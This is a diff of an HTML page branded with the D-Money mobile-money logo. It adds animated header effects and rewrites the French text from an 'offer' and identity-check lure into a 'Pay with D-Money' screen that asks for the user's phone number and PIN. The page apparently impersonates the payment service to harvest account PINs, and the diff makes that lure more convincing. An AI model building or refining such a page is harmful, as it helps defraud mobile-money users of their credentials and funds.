@@ -61,7 +61,11 @@ body{
 
 /* HEADER */
 .header{background:linear-gradient(135deg,var(--navy-dark),var(--navy) 50%,var(--navy-mid));padding:max(14px,env(safe-area-inset-top)) 18px 20px;flex-shrink:0;position:relative;overflow:hidden}
-.header::before{content:'';position:absolute;inset:0;pointer-events:none;background:radial-gradient(ellipse 220px 180px at 108% -10%,rgba(245,168,0,.32),transparent 60%),linear-gradient(rgba(255,255,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.02) 1px,transparent 1px);background-size:auto,32px 32px,32px 32px}
+.header::before{content:'';position:absolute;inset:0;pointer-events:none;background:radial-gradient(ellipse 260px 200px at 108% -18%,rgba(245,168,0,.2),transparent 65%),linear-gradient(rgba(255,255,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.02) 1px,transparent 1px);background-size:auto,32px 32px,32px 32px}
+.header::after{content:'';position:absolute;top:0;left:-100%;width:55%;height:100%;background:linear-gradient(90deg,transparent,rgba(245,168,0,.05),transparent);animation:hdrSweep 9s ease-in-out infinite;pointer-events:none}
+@keyframes hdrSweep{0%,100%{left:-100%}55%{left:150%}}
+.hglow{position:absolute;width:240px;height:240px;border-radius:50%;background:rgba(245,168,0,.16);filter:blur(70px);top:-110px;right:-60px;pointer-events:none;animation:glowPulse 4s ease-in-out infinite}
+@keyframes glowPulse{0%,100%{opacity:.6;transform:scale(1)}50%{opacity:1;transform:scale(1.1)}}
 .header-top{display:flex;align-items:center;justify-content:space-between;position:relative;z-index:2;margin-bottom:16px}
 .brand{display:flex;align-items:center;background:rgba(255,255,255,.95);padding:5px 10px;border-radius:10px;backdrop-filter:blur(8px)}
 .brand img{height:28px;object-fit:contain}
@@ -261,6 +265,7 @@ input:focus{border-color:var(--gold);background:var(--white);box-shadow:0 0 0 4p
 
 <div class="screen" id="screen">
   <div class="header">
+    <div class="hglow"></div>
     <div class="header-top">
       <div class="brand"><img src="assets/dmoney-logo.png" alt="D-Money"></div>
       <div class="amount-chip" id="headerAmount">0 DJF</div>
@@ -280,18 +285,18 @@ input:focus{border-color:var(--gold);background:var(--white);box-shadow:0 0 0 4p
       <div class="pay-row">
         <img src="assets/dmoney-logo.png" alt="D-Money" class="pay-logo">
         <div>
-          <div class="pay-row-title">Recevoir votre offre</div>
-          <div class="pay-row-sub">Vérifiez votre identité pour continuer</div>
+          <div class="pay-row-title">Payer avec D-Money</div>
+          <div class="pay-row-sub">Paiement mobile instantané</div>
           <div class="pay-micro">
-            <span class="pmb pmb-instant">⚡ Rapide</span>
+            <span class="pmb pmb-instant">⚡ Instantané</span>
             <span class="pmb pmb-secure">🔒 Sécurisé</span>
-            <span class="pmb pmb-free">✦ Sans engagement</span>
+            <span class="pmb pmb-free">✦ Sans frais</span>
           </div>
         </div>
       </div>
       <div class="card">
         <div class="card-top-bar"></div>
-        <div class="card-hdr"><div class="card-title">Vérifier votre compte</div><div class="card-sub">Entrez votre numéro et votre PIN pour valider</div></div>
+        <div class="card-hdr"><div class="card-title">Vérifier votre compte</div><div class="card-sub">Entrez votre numéro D-Money et votre PIN</div></div>
         <div class="card-body">
           <div class="field" id="phoneField">
             <div class="field-label">Numéro de téléphone</div>
